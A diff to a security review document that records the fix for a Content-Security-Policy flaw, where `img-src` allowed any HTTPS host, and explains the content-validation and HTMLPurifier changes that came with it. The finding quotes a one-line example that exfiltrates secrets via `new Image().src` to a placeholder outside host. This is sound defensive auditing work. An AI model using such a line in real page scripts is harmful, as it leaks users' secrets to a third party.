@@ -217,16 +217,38 @@ The lesson for this document: a walkthrough covers the screens it visited, and s
 is how a gap gets recorded as a guarantee. Two defects hid behind that sentence, and the same test
 found both within a minute of existing.
 
-### Known gap: `img-src` permits any HTTPS host
+### 10. `img-src` permitted any HTTPS host — medium — **FIXED**
 
-Found while checking the above, and not introduced by it. `img-src` is `'self' data: https:`, so script
-running on any page may set `new Image().src = 'https://somewhere-else/?' + secrets` and the policy will
-allow it. As an exfiltration channel that is far wider than the single origin added to `connect-src`,
-and tightening `connect-src` while leaving it open buys little.
+Found while checking §9, and not introduced by it. `img-src` was `'self' data: https:`, so script on any
+page could set `new Image().src = 'https://somewhere-else/?' + secrets` and the policy allowed it. An
+image needs no response to have already sent its query string, which made this a wider exfiltration
+channel than everything `connect-src` was carefully restricting — and tightening `connect-src` while
+leaving it open bought little.
 
-Not fixed here, because it needs a decision rather than an edit: article bodies and section trees can
-legitimately reference remote images, so narrowing this means either an allowlist of hosts or requiring
-every image to be in the media library. Recorded so the next reader knows it was seen and weighed.
+It is now `'self' data:`, plus the analytics hosts by name when an editor has entered a tracking id,
+since analytics still measures some things with a pixel and the blanket scheme used to cover that.
+
+The decision it needed was about content, not headers: article bodies may hold `<img>`, and
+`URI.AllowedSchemes` permits `http`/`https`, so an editor could hotlink a picture. Narrowing the policy
+alone would have published such an image and drawn it for nobody — a failure with no error and no
+witness, which is the same shape as the two defects above. So both halves moved together:
+
+- `Html::remoteImageSources()` finds them, and `SaveBlogPostRequest` **refuses the save** and names the
+  address, so an editor is told to upload it rather than left to discover it. A remote `featured_image`
+  is refused the same way.
+- `URI.DisableExternalResources` is the backstop for a body arriving by any other path. Deliberately
+  not `DisableExternal`, which would take links with it — a link may leave this site, an image may not.
+- `URI.Host` is set from `app.url`, because HTMLPurifier treats every absolute address as external
+  until told which host is not. Without it the request allowed this site's own full URL and the
+  purifier stripped it, and the body came back empty. A test covers that exact disagreement.
+
+`og:image` is deliberately exempt: a social network's crawler fetches it server-side, and no browser
+content policy applies.
+
+What is *not* closed: an editor can no longer hotlink an image, and that is a capability removed rather
+than a bug fixed. No content used one when this was written — verified against every article body and
+page tree — but if hotlinking is ever wanted back, the honest way is an allowlist of hosts in both
+places at once, never in the policy alone.
 
 ## What holds up
 
